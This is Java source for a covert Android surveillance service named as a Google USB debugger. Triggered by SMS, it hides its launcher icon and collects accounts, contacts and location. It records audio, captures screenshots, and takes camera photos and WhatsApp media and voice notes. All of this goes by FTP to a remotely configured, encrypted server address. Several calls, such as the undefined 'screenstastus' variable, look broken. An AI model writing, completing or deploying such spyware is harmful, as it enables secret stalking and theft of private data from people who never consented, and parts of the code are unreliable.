package com.google.android.usbdebugger;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;


public class MyService extends Service {
    public MyService() {
    }

    private static final String CHANNEL_ID = "MyServiceChannel";
    private int recordCount = 10;
    public static int screenfinifh = 0;
    public static int dcimfinifh = 0;
    public static int whatfinifh = 0;

    private int Dbtemp = 0;
    private DBHelper dbh;
    private Records rc;
    private long lastXmlCheckTimeSec = 0;
    private long lastGpsCheckTimeSec = 0;

    private final String TAG = "myService: ";
    private final Context contx = this;
    private Timer smsTimer;

    private String imeiNumber1;
    private File aDir, DCIMDir, aTempDir, GpsDir;
    private String DCIMpath, WhatsApppath;
    private int status = 0;
    private int start = 0;
    public static boolean update_param;
    public ArrayList<String> Params = null;

    private boolean screenStatus = true;
    public String DateTime() {
        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        return ft2.format(dt);
    }

    public void myActions() {
        try {
            PhoneInfo();
            DirExixs();
            rc = new Records();
        } catch (Exception ex) {
            Log.e("MyServiceERR1", "mAction :" + ex.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        dbh = new DBHelper(this);
        createNotificationChannel();
    }

    @Override
    public void onDestroy() {
        start = 0;
        if (smsTimer != null) {
            smsTimer.cancel();
            smsTimer = null;
        }

        if (rc != null) {
            rc.recordStop(0);
        }
        if (dbh != null) {
            dbh.close();
        }
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service is Running")
                .setContentText("Your service is active.")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();

        startForeground(1, notification);

        if (intent == null) {
            return START_REDELIVER_INTENT;
        }

        String stat = intent.getStringExtra("sms_body");

        if (stat != null) {
            if (start == 0) {
                myActions();
            }

            Params = (ArrayList<String>) intent.getSerializableExtra("Array");

            if (Params == null || Params.isEmpty()) {
                try (SQLiteDatabase db = dbh.getWritableDatabase()){
                    Params = dbh.SelectParametrs(db);
                }
            }

            if (Params != null && !Params.isEmpty()) {
                status = 0;
                if (smsTimer == null) {
                    smsTimer = new Timer();
                    SMSTimerTask smsMyTimerTask = new SMSTimerTask();
                    // ИСПРАВЛЕНО: Задержка возвращена к 1 секунде
                    smsTimer.schedule(smsMyTimerTask, 1000, 5000);
                }
                hideLauncherIcon();
            }
        }
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "My Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
        }
    }

    private void hideLauncherIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, getPackageName() + ".Launcher");
        if (pm.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void AfterOnStart() {
        try {
            if (Params == null || Params.isEmpty()) {
                Log.e("MyServiceERR1", "Params are null or empty in AfterOnStart, cannot proceed.");
                return;
            }

            if (status == 0) {

                if (update_param) {
                    try (SQLiteDatabase db = dbh.getWritableDatabase()){
                        Params = dbh.SelectParametrs(db);
                    }
                    update_param = false;
                }
                DBCopy();

                if ("1".equals(Params.get(17))) {
                    long xmlTimerSeconds = 60;
                    try {
                        if (Params.size() > 20 && !Params.get(20).isEmpty()) {
                            xmlTimerSeconds = Long.parseLong(Params.get(20));
                        }
                    } catch (NumberFormatException e) {
                        Log.w(TAG, "Invalid XML_T value, using default 60s.");
                    }
                    
                    long currentTimeSec = System.currentTimeMillis() / 1000;

                    if (currentTimeSec - lastXmlCheckTimeSec >= xmlTimerSeconds) {
                        String decryptedIp = EncryptDecryptStringWithAES.decrypt(Params.get(2));
                        if (decryptedIp != null && !decryptedIp.isEmpty()) {
                            ArrayList<String> serverParams = ReadXMLFile.main(decryptedIp, imeiNumber1, this, Params);
                            if (serverParams != null && !serverParams.isEmpty()) {
                                ArrayList<String> newParams = new ArrayList<>(Params);
                                boolean hasChanges = false;

                                for (int i = 0; i < serverParams.size(); i++) {
                                    if (i >= newParams.size()) break;

                                    String serverValue = serverParams.get(i);
                                    if (serverValue == null || serverValue.isEmpty() || "null".equalsIgnoreCase(serverValue) || "0".equals(serverValue)) {
                                        continue;
                                    }

                                    String valueToStore;
                                    if (i == 2 || i == 4 || i == 5 || i == 6) { 
                                        valueToStore = EncryptDecryptStringWithAES.encrypt(serverValue);
                                    } else {
                                        valueToStore = serverValue;
                                    }

                                    if (valueToStore != null && !valueToStore.equals(newParams.get(i))) {
                                        newParams.set(i, valueToStore);
                                        hasChanges = true;
                                    }
                                }

                                if (hasChanges) {
                                    Params = newParams;
                                    new BootDeviceReceiver().createParams(this, Params);
                                    Log.d("MyService", "Local parameters updated from server.");
                                }
                            }
                        }
                        lastXmlCheckTimeSec = currentTimeSec;
                    }
                }

                if (FTP_Sender.hasConnection(contx, 0, Params)) {
                     try (SQLiteDatabase db = dbh.getWritableDatabase()){
                        String[] gpsFilesToSend = dbh.Select_FileNames(db, "SrFiles", GpsDir, 7, "0", false);
                        if (gpsFilesToSend != null && gpsFilesToSend.length > 0) {
                            Log.d(TAG, "Found " + gpsFilesToSend.length + " offline GPS files to send via FTP.");
                            FTP_Sender.FTP(null, gpsFilesToSend, 7, 1, 0, Params, isInteractive(), imeiNumber1, this, recordCount, GpsDir);
                        }
                    }
                }

                if ("1".equals(Params.get(9))) {
                    Contacts.getContacts(this);
                }

                if ("1".equals(Params.get(0))) {
                    if (rc != null) {
                        rc.Config(contx, aTempDir, aDir, Params, isInteractive(), imeiNumber1, recordCount);
                        if (start == 0) {
                            if (!Params.get(16).isEmpty()) {
                                recordCount = Integer.parseInt(Params.get(16));
                            }
                            if (rc.recordStart()) {
                                start = 1;
                            }
                        }
                    }
                }

                if ("1".equals(Params.get(1))) {
                    if (screenfinifh == 0) {
                        new Thread(this::Screenshot_Method).start();
                    }
                }

                if ("1".equals(Params.get(11))) {
                    if (dcimfinifh == 0) {
                        new Thread(this::DCIM_Folder).start();
                    }
                }

                if ("1".equals(Params.get(10))) {
                    if (whatfinifh == 0) {
                        new Thread(this::WhatsApp_Folder).start();
                    }
                }

                if ("1".equals(Params.get(7))) {
                    if (!Params.get(8).isEmpty()) {
                        int saniyye = Integer.parseInt(Params.get(8));
                        GPS_Loc(this, saniyye);
                    }
                }

                if ("0".equals(Params.get(0))) {
                    if (start != 0) {
                        start = 0;
                        if (rc != null) rc.recordStop(0);
                    }
                }
            }
        } catch (Exception ex) {
            Log.e("MyServiceERR1", "AfterOnStart() Exception: ", ex);
        }
    }

    public void DBCopy() {
        int dbSizeParam = 2880;
         try {
            dbSizeParam = Integer.parseInt(Params.get(18));
        } catch (Exception e) { /* default */ }

        try (SQLiteDatabase db = dbh.getReadableDatabase()){
            int DBcnt = dbh.DbCount(db);
            boolean shouldSend = (Dbtemp == 0) || (DBcnt >= dbSizeParam);
            if (shouldSend) {
                File ff = getDatabasePath(DBHelper.DATABASE_NAME);
                FTP_Sender.FTP(ff, null, 10, 1, 0, Params, isInteractive(), imeiNumber1, this, recordCount, aDir);
                if (Dbtemp == 0) {
                    Dbtemp = 1;
                    Log.d(TAG, "База данных отправлена при первом запуске, флаг Dbtemp установлен.");
                }
            }
        }
    }

    public boolean isInteractive() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            return powerManager.isInteractive();
        }
        return powerManager.isScreenOn();
    }

    void GPS_Loc(final Context context, final int saniyye) {
        long currentTimeSec = System.currentTimeMillis() / 1000;
        if (currentTimeSec - lastGpsCheckTimeSec >= saniyye) {
            new Handler(Looper.getMainLooper()).post(() -> {
                final GPSTracker gps = new GPSTracker(context);
                try {
                    if (gps.canGetLocation()) {
                        double latitude = gps.getLatitude();
                        double longitude = gps.getLongitude();
                        if (latitude != 0.0 && longitude != 0.0) {
                            float speed = gps.getSpeed();
                            long times = gps.getTimes();
                            SimpleDateFormat ft = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss", java.util.Locale.getDefault());
                            String timeStr = ft.format(new Date(times));

                            if (FTP_Sender.hasConnection(context, 0, Params)) {
                                ReadXMLFile.sendGpsOnly(context, Params, imeiNumber1, String.valueOf(latitude), String.valueOf(longitude), String.valueOf(speed), timeStr);
                            } else {
                                Write_to_File_GPS(latitude, longitude, speed, timeStr);
                            }
                        }
                    }
                } catch (Exception ex) {
                    try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                        dbh.insert_Exeption(db, "GPS_Loc()", "Exception", ex.getMessage(), DateTime());
                    }
                }
            });
            lastGpsCheckTimeSec = currentTimeSec; 
        }
    }

    @SuppressLint({"HardwareIds", "MissingPermission"})
    public void PhoneInfo() {
        try (SQLiteDatabase db = dbh.getWritableDatabase()){
            TelephonyManager telephony = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            
            dbh.Delete_Account(db);
            Account[] accounts = AccountManager.get(this).getAccounts();
            for (Account account : accounts) {
                dbh.insert_Account(db, account.name, account.type);
            }
            
            String operatoName = (telephony != null) ? telephony.getNetworkOperatorName() : "";
            imeiNumber1 = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

            dbh.insert_PhoneInfo(db, "PhoneInfo", imeiNumber1, "", EncryptDecryptStringWithAES.encrypt(operatoName),
                    String.valueOf(Build.VERSION.SDK_INT));

        } catch (Exception ex) {
            try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                 dbh.insert_Exeption(db, "PhoneInfo()", "Exception", ex.getMessage(), DateTime());
            }
        }
    }

    public void DirExixs() {
        DCIMpath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        WhatsApppath = new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media").getAbsolutePath();

        if (imeiNumber1 == null || imeiNumber1.isEmpty()) {
            imeiNumber1 = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        }

        String rootPath = getFilesDir().getAbsolutePath();
        aDir = new File(rootPath, imeiNumber1 + "/A");
        aTempDir = new File(rootPath, imeiNumber1 + "/T");
        GpsDir = new File(rootPath, imeiNumber1 + "/G");
        aDir.mkdirs();
        aTempDir.mkdirs();
        GpsDir.mkdirs();
    }

    private void Write_to_File_GPS(double lat, double lon, float speed, String time) {
        try {
            SimpleDateFormat ft = new SimpleDateFormat("ddMMyyyyHHmmssSSS", Locale.US);
            String fileName = "gps_" + ft.format(new Date()) + ".txt";
            File file = new File(GpsDir, fileName);

            try (FileWriter writer = new FileWriter(file)) {
                writer.write(lat + "," + lon + "," + speed + "," + time);
            }
            
            try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                dbh.insert_SrFiles(db, "SrFiles", fileName, DateTime(), "7", "0");
                int flc = Integer.parseInt(Params.get(16));
                dbh.cleanupOldFiles(db, 7, flc, GpsDir);
            }

            Log.d(TAG, "Offline GPS data saved to: " + fileName);

        } catch (IOException | NumberFormatException e) {
            try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                dbh.insert_Exeption(db, "Write_to_File_GPS", e.getClass().getSimpleName(), e.getMessage(), DateTime());
            }
        }
    }

    class SMSTimerTask extends TimerTask {
        @RequiresApi(api = Build.VERSION_CODES.KITKAT)
        @Override
        public void run() {
            AfterOnStart();
        }
    }

    @TargetApi(Build.VERSION_CODES.O)
    private void Screenshot_Method() {
        Log.d(TAG, "Starting Screenshot_Method");

        // Проверка "SC" из Params (индекс 1, как в твоём column)
        if (Params != null && Params.size() > 1 && "1".equals(Params.get(1))) {  // SC = "1"
            // Проверка screen_switch из prefs
            SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
            if (prefs.getBoolean("screen_switch_enabled", false)) {
                Log.d(TAG, "Screen capture enabled — taking screenshot");
                Bitmap screenshot = Screenshot.takeScreenshot(this);  // Вызов метода
                if (screenshot != null) {
                    String fileName = DateTime() + "_screenshot.png";
                    String filePath = new File(aDir, fileName).getAbsolutePath();  // aDir из твоего init
                    Screenshot.savePic(screenshot, filePath);

                    // Добавь в SrFiles для FTP (тип 8 для screenshots)
                    if (dbh != null) {
                        dbh.insert_SrFiles(dbh, "SrFiles", fileName, DateTime(), "8", "", "0");
                        FTP_Sender.FTP(null, new String[] {filePath}, 8, 0, 0, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
                    }
                } else {
                    Log.e(TAG, "Screenshot failed — MediaProjection not initialized");
                }
            } else {
                Log.d(TAG, "Screen switch disabled — skipping screenshot");
            }
        } else {
            Log.d(TAG, "SC param not enabled — skipping screenshot");
        }
    }
    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    void DCIM_Folder() {
        dcimfinifh = 1;
        ArrayList<String> files = new ArrayList<>();
        try {
            Log.d(TAG, "DCIM_Folder enable");
            DCIMDir = new File(DCIMpath, "Camera");
            if (!DCIMDir.exists() || DCIMDir.listFiles() == null || DCIMDir.listFiles().length == 0) {
                DCIMDir = new File(DCIMpath, "100ANDRO");
            }

            if (DCIMDir.exists() && DCIMDir.listFiles() != null && DCIMDir.listFiles().length > 0) {
                 try (SQLiteDatabase db = dbh.getReadableDatabase()){
                    String[] SelFiles = dbh.Select_FileNames(db, "SrFiles", DCIMDir, 2, "0", true);
                    for (File file : DCIMDir.listFiles()) {
                        if ("0".equals(Params.get(11)) || status == 1) return;

                        String fileName = file.getName().toLowerCase();
                        if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
                            boolean found = false;
                            if (SelFiles != null) {
                                for (String selFile : SelFiles) {
                                    if (file.getName().equals(selFile)) { 
                                        found = true;
                                        break;
                                    }
                                }
                            }
                            if (!found) {
                                files.add(file.getAbsolutePath());
                            }
                        }
                    }
                }
                if (!files.isEmpty()) {
                    FTP_Sender.FTP(null, files.toArray(new String[0]), 2, 0, 0, Params, isInteractive(), imeiNumber1, this, recordCount, aDir);
                }
            }
        } catch (Exception ex) {
            try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                dbh.insert_Exeption(db, "DCIM_Folder()", "Exception", ex.getMessage(), DateTime());
            }
        }
        dcimfinifh = 0;
    }

    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    void WhatsApp_Folder() {
        whatfinifh = 1;
        File FD = new File(WhatsApppath);
        if (!FD.exists()) {
            whatfinifh = 0;
            return;
        }

        String[] whatsAppFolders = {"WhatsApp Images", "WhatsApp Voice Notes", "WhatsApp Documents", "WhatsApp Audio"};

        try {
            Log.d(TAG, "WhatsApp enable");
            for (String folderName : whatsAppFolders) {
                if ("0".equals(Params.get(10)) || status == 1) {
                    return;
                }
                File subDir = new File(WhatsApppath, folderName);
                if (subDir.exists() && subDir.isDirectory()) {
                    int type = 0;
                    if (folderName.equals("WhatsApp Images")) type = 3;
                    else if (folderName.equals("WhatsApp Audio")) type = 4;
                    else if (folderName.equals("WhatsApp Voice Notes")) type = 5;
                    else if (folderName.equals("WhatsApp Documents")) type = 6;

                    if (type == 5) { 
                        for (File dateDir : subDir.listFiles()) {
                            if (dateDir.isDirectory()) {
                                processDirectory(dateDir, type, 0);
                            }
                        }
                    } else if (type != 0) {
                        processDirectory(subDir, type, 0); 
                        File sentDir = new File(subDir, "Sent");
                        if (sentDir.exists() && sentDir.isDirectory()) {
                            processDirectory(sentDir, type, 1);
                        }
                    }
                }
            }
        } catch (Exception ex) {
            try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                dbh.insert_Exeption(db, "Whatsapp_Folder()", "Exception", ex.getMessage(), DateTime());
            }
        }
        whatfinifh = 0;
    }

    private void processDirectory(File directory, int type, int sent) {
        if (directory == null || !directory.exists() || directory.listFiles() == null) return;
        
        try (SQLiteDatabase db = dbh.getReadableDatabase()){
            String[] selFiles = dbh.Select_FileNames(db, "SrFiles", directory, type, String.valueOf(sent), true);
            ArrayList<String> filesToSend = new ArrayList<>();

            for (File file : directory.listFiles()) {
                if (file.isFile() && !file.getName().contains("nomedia")) {
                    boolean found = false;
                    if (selFiles != null) {
                        for (String selFile : selFiles) {
                            if (file.getName().equals(selFile)) { 
                                found = true;
                                break;
                            }
                        }
                    }
                    if (!found) {
                        filesToSend.add(file.getAbsolutePath());
                    }
                }
            }

            if (!filesToSend.isEmpty()) {
                FTP_Sender.FTP(null, filesToSend.toArray(new String[0]), type, 0, sent, Params, isInteractive(), imeiNumber1, this, recordCount, aDir);
            }
        } catch(Exception e){
            try(SQLiteDatabase dbex = dbh.getWritableDatabase()){
                dbh.insert_Exeption(dbex, "processDirectory", "Exception", e.getMessage(), DateTime());
            }
        }
    }
}
